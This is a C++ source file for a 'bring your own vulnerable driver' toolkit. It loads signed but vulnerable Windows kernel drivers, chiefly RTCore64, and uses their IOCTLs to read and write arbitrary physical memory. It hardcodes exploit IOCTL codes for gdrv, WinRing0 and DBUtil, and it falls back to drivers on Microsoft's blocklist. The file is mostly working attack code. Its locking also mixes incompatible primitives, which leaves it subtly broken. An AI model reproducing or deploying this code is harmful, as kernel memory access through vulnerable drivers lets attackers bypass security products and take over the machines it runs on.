/*
 * Universal Vulnerable Driver Interface - Implementation
 * Professional-grade kernel driver abstraction layer
 * 
 * Implements support for multiple vulnerable drivers with automatic failover
 */

#include "pch.h"
#include "UniversalDriverInterface.h"
#include <iostream>
#include <iomanip>
#include <sstream>
#include <sys/stat.h>  // For file existence check (compatible with older MinGW)

namespace KernelInterface {

// Global instance
UniversalDriverManager g_KernelDriver;

// ================================================================================
// OperationResult Implementation
// ================================================================================

std::string OperationResult::GetErrorMessage() const {
    std::stringstream ss;
    
    switch (status) {
        case DriverStatus::SUCCESS:
            return "Operation successful";
        case DriverStatus::DRIVER_NOT_FOUND:
            ss << "Driver not found";
            break;
        case DriverStatus::DRIVER_LOAD_FAILED:
            ss << "Failed to load driver";
            break;
        case DriverStatus::DRIVER_ACCESS_DENIED:
            ss << "Access denied - run as Administrator";
            break;
        case DriverStatus::DRIVER_INCOMPATIBLE:
            ss << "Driver incompatible with this operation";
            break;
        case DriverStatus::MEMORY_READ_FAILED:
            ss << "Memory read failed";
            break;
        case DriverStatus::MEMORY_WRITE_FAILED:
            ss << "Memory write failed";
            break;
        case DriverStatus::INVALID_PARAMETER:
            ss << "Invalid parameter";
            break;
        case DriverStatus::NOT_INITIALIZED:
            ss << "Driver not initialized";
            break;
        default:
            ss << "Unknown error";
            break;
    }
    
    if (systemError != 0) {
        ss << " (System Error: 0x" << std::hex << systemError << ")";
    }
    
    if (!message.empty()) {
        ss << " - " << message;
    }
    
    return ss.str();
}

// ================================================================================
// RTCore64Interface Implementation
// ================================================================================

RTCore64Interface::RTCore64Interface() 
    : hDriver(INVALID_HANDLE_VALUE)
    , connected(false)
    , driverInfo(VulnerableDrivers::RTCORE64)
{
    InitializeCriticalSection(&mutex);
}

RTCore64Interface::~RTCore64Interface() {
    Disconnect();
    DeleteCriticalSection(&mutex);
}

bool RTCore64Interface::EnsureServiceRunning() {
    // Check if RTCore64.sys exists (compatible with older compilers)
    DWORD attr = GetFileAttributesW(driverInfo.commonLocation.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES) {
        return false;
    }
    
    // Try to start service
    SC_HANDLE hSCManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCManager, driverInfo.name.c_str(), SERVICE_ALL_ACCESS);
    
    if (!hService) {
        // Service doesn't exist, create it
        hService = CreateServiceW(
            hSCManager,
            driverInfo.name.c_str(),
            driverInfo.description.c_str(),
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            driverInfo.commonLocation.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr
        );
        
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return false;
        }
    }
    
    // Try to start the service
    SERVICE_STATUS status;
    if (!QueryServiceStatus(hService, &status)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }
    
    if (status.dwCurrentState != SERVICE_RUNNING) {
        StartServiceW(hService, 0, nullptr);
        Sleep(500); // Give it time to start
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool RTCore64Interface::Connect() {
    EnterCriticalSection(&mutex);
    
    if (connected) {
        return true;
    }
    
    // Try to open device
    hDriver = CreateFileW(
        driverInfo.devicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    
    if (hDriver == INVALID_HANDLE_VALUE) {
        // Try to ensure service is running
        if (EnsureServiceRunning()) {
            // Retry
            Sleep(1000);
            hDriver = CreateFileW(
                driverInfo.devicePath.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );
        }
    }
    
    if (hDriver == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    connected = true;
    return true;
}

void RTCore64Interface::Disconnect() {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
    connected = false;
}

bool RTCore64Interface::IsConnected() const {
    std::lock_guard<std::mutex> lock(mutex);
    return connected;
}

OperationResult RTCore64Interface::ReadPhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    OperationResult result;
    
    if (!connected) {
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    if (!buffer || size == 0) {
        result.status = DriverStatus::INVALID_PARAMETER;
        return result;
    }
    
    BYTE* pBuffer = (BYTE*)buffer;
    SIZE_T bytesRead = 0;
    
    // RTCore64 reads in 4-byte chunks
    while (bytesRead < size) {
        RTCore64Request request = {};
        request.Address = address + bytesRead;
        request.Size = 4;
        
        DWORD bytesReturned = 0;
        if (!DeviceIoControl(
            hDriver,
            IOCTL_READ_MEMORY,
            &request,
            sizeof(request),
            &request,
            sizeof(request),
            &bytesReturned,
            nullptr))
        {
            result.status = DriverStatus::MEMORY_READ_FAILED;
            result.systemError = GetLastError();
            result.bytesProcessed = bytesRead;
            return result;
        }
        
        // Copy the data
        SIZE_T toCopy = min(4, size - bytesRead);
        memcpy(pBuffer + bytesRead, &request.Value, toCopy);
        bytesRead += toCopy;
    }
    
    result.status = DriverStatus::SUCCESS;
    result.bytesProcessed = bytesRead;
    return result;
}

OperationResult RTCore64Interface::WritePhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    OperationResult result;
    
    if (!connected) {
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    if (!buffer || size == 0) {
        result.status = DriverStatus::INVALID_PARAMETER;
        return result;
    }
    
    BYTE* pBuffer = (BYTE*)buffer;
    SIZE_T bytesWritten = 0;
    
    // RTCore64 writes in 4-byte chunks
    while (bytesWritten < size) {
        RTCore64Request request = {};
        request.Address = address + bytesWritten;
        request.Size = 4;
        
        // Copy data to write
        SIZE_T toCopy = min(4, size - bytesWritten);
        memcpy(&request.Value, pBuffer + bytesWritten, toCopy);
        
        DWORD bytesReturned = 0;
        if (!DeviceIoControl(
            hDriver,
            IOCTL_WRITE_MEMORY,
            &request,
            sizeof(request),
            nullptr,
            0,
            &bytesReturned,
            nullptr))
        {
            result.status = DriverStatus::MEMORY_WRITE_FAILED;
            result.systemError = GetLastError();
            result.bytesProcessed = bytesWritten;
            return result;
        }
        
        bytesWritten += toCopy;
    }
    
    result.status = DriverStatus::SUCCESS;
    result.bytesProcessed = bytesWritten;
    return result;
}

OperationResult RTCore64Interface::ReadVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    // Convert virtual to physical address first (simplified - would need full page table walk)
    // For now, return incompatible
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    result.message = "RTCore64 requires physical addresses - use physical memory read or implement VtoP translation";
    return result;
}

OperationResult RTCore64Interface::WriteVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    result.message = "RTCore64 requires physical addresses - use physical memory write or implement VtoP translation";
    return result;
}

// ================================================================================
// GenericDriverInterface Implementation
// ================================================================================

GenericDriverInterface::GenericDriverInterface(const VulnerableDrivers::DriverInfo& info)
    : hDriver(INVALID_HANDLE_VALUE)
    , connected(false)
    , driverInfo(info)
    , ioctl_read_phys(0)
    , ioctl_write_phys(0)
    , ioctl_map_io(0)
{
    MapDriverIOCTLs();
}

GenericDriverInterface::~GenericDriverInterface() {
    Disconnect();
}

bool GenericDriverInterface::MapDriverIOCTLs() {
    // Map known IOCTLs for different drivers
    // This is driver-specific and would need to be expanded
    
    if (driverInfo.name == L"GDRV") {
        // gdrv.sys IOCTLs
        ioctl_read_phys = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x19, METHOD_BUFFERED, FILE_ANY_ACCESS);
        ioctl_write_phys = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x1A, METHOD_BUFFERED, FILE_ANY_ACCESS);
        return true;
    }
    else if (driverInfo.name == L"WinRing0") {
        // WinRing0 IOCTLs
        ioctl_read_phys = 0x9C402430;
        ioctl_write_phys = 0x9C402434;
        ioctl_map_io = 0x9C40241C;
        return true;
    }
    else if (driverInfo.name == L"DBUtil") {
        // DBUtil IOCTLs
        ioctl_read_phys = 0x9B0C1EC4;
        ioctl_write_phys = 0x9B0C1EC8;
        return true;
    }
    
    return false;
}

bool GenericDriverInterface::Connect() {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (connected) {
        return true;
    }
    
    hDriver = CreateFileW(
        driverInfo.devicePath.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );
    
    if (hDriver == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    connected = true;
    return true;
}

void GenericDriverInterface::Disconnect() {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
    connected = false;
}

bool GenericDriverInterface::IsConnected() const {
    std::lock_guard<std::mutex> lock(mutex);
    return connected;
}

OperationResult GenericDriverInterface::ReadPhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    result.message = "Generic driver implementation needs IOCTLs mapped for: " + std::string(driverInfo.name.begin(), driverInfo.name.end());
    return result;
}

OperationResult GenericDriverInterface::WritePhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    result.message = "Generic driver implementation needs IOCTLs mapped";
    return result;
}

OperationResult GenericDriverInterface::ReadVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    return result;
}

OperationResult GenericDriverInterface::WriteVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    OperationResult result;
    result.status = DriverStatus::DRIVER_INCOMPATIBLE;
    return result;
}

// ================================================================================
// UniversalDriverManager Implementation
// ================================================================================

UniversalDriverManager::UniversalDriverManager()
    : autoFailover(true)
{
}

UniversalDriverManager::~UniversalDriverManager() {
    Shutdown();
}

void UniversalDriverManager::Log(const std::string& message) {
    if (logCallback) {
        logCallback(message);
    } else {
        std::cout << "[Kernel Driver] " << message << std::endl;
    }
}

bool UniversalDriverManager::Initialize() {
    std::lock_guard<std::mutex> lock(mutex);
    
    Log("Initializing Universal Driver Manager...");
    
    // Get all unblocked drivers first (best compatibility)
    auto unblocked = VulnerableDrivers::GetUnblockedDrivers();
    auto allDrivers = VulnerableDrivers::GetAllDrivers();
    
    // Try unblocked drivers first
    for (const auto& info : unblocked) {
        if (VulnerableDrivers::DriverExists(info)) {
            Log("Found unblocked driver: " + std::string(info.name.begin(), info.name.end()));
            
            std::unique_ptr<IDriverInterface> driver;
            
            if (info.name == L"RTCore64") {
                driver = std::make_unique<RTCore64Interface>();
            } else {
                driver = std::make_unique<GenericDriverInterface>(info);
            }
            
            if (driver->Connect()) {
                Log("Successfully connected to: " + std::string(info.name.begin(), info.name.end()));
                currentDriver = std::move(driver);
                return true;
            }
        }
    }
    
    // Try blocked drivers if no unblocked ones worked
    for (const auto& info : allDrivers) {
        if (info.microsoftBlocked && VulnerableDrivers::DriverExists(info)) {
            Log("Trying blocked driver: " + std::string(info.name.begin(), info.name.end()));
            
            std::unique_ptr<IDriverInterface> driver;
            
            if (info.name == L"RTCore64") {
                driver = std::make_unique<RTCore64Interface>();
            } else {
                driver = std::make_unique<GenericDriverInterface>(info);
            }
            
            if (driver->Connect()) {
                Log("Successfully connected to: " + std::string(info.name.begin(), info.name.end()));
                currentDriver = std::move(driver);
                return true;
            }
        }
    }
    
    Log("Failed to initialize any driver");
    return false;
}

bool UniversalDriverManager::InitializeWithDriver(const std::wstring& driverName) {
    std::lock_guard<std::mutex> lock(mutex);
    
    for (const auto& info : VulnerableDrivers::GetAllDrivers()) {
        if (info.name == driverName) {
            std::unique_ptr<IDriverInterface> driver;
            
            if (info.name == L"RTCore64") {
                driver = std::make_unique<RTCore64Interface>();
            } else {
                driver = std::make_unique<GenericDriverInterface>(info);
            }
            
            if (driver->Connect()) {
                Log("Connected to requested driver: " + std::string(driverName.begin(), driverName.end()));
                currentDriver = std::move(driver);
                return true;
            }
        }
    }
    
    return false;
}

void UniversalDriverManager::Shutdown() {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (currentDriver) {
        currentDriver->Disconnect();
        currentDriver.reset();
        Log("Driver manager shutdown");
    }
}

bool UniversalDriverManager::IsInitialized() const {
    std::lock_guard<std::mutex> lock(mutex);
    return currentDriver != nullptr && currentDriver->IsConnected();
}

std::wstring UniversalDriverManager::GetCurrentDriverName() const {
    std::lock_guard<std::mutex> lock(mutex);
    if (currentDriver) {
        return currentDriver->GetDriverName();
    }
    return L"None";
}

VulnerableDrivers::DriverInfo UniversalDriverManager::GetCurrentDriverInfo() const {
    std::lock_guard<std::mutex> lock(mutex);
    if (currentDriver) {
        return currentDriver->GetDriverInfo();
    }
    return VulnerableDrivers::RTCORE64; // Default
}

std::vector<VulnerableDrivers::DriverInfo> UniversalDriverManager::GetAvailableDrivers() const {
    return VulnerableDrivers::GetAllDrivers();
}

std::vector<VulnerableDrivers::DriverInfo> UniversalDriverManager::GetInstalledDrivers() const {
    return VulnerableDrivers::FindInstalledDrivers();
}

OperationResult UniversalDriverManager::ReadPhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (!currentDriver) {
        OperationResult result;
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    return currentDriver->ReadPhysicalMemory(address, buffer, size);
}

OperationResult UniversalDriverManager::WritePhysicalMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (!currentDriver) {
        OperationResult result;
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    return currentDriver->WritePhysicalMemory(address, buffer, size);
}

OperationResult UniversalDriverManager::ReadVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (!currentDriver) {
        OperationResult result;
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    return currentDriver->ReadVirtualMemory(processId, address, buffer, size);
}

OperationResult UniversalDriverManager::WriteVirtualMemory(DWORD processId, ULONG64 address, PVOID buffer, SIZE_T size) {
    std::lock_guard<std::mutex> lock(mutex);
    
    if (!currentDriver) {
        OperationResult result;
        result.status = DriverStatus::NOT_INITIALIZED;
        return result;
    }
    
    return currentDriver->WriteVirtualMemory(processId, address, buffer, size);
}

} // namespace KernelInterface

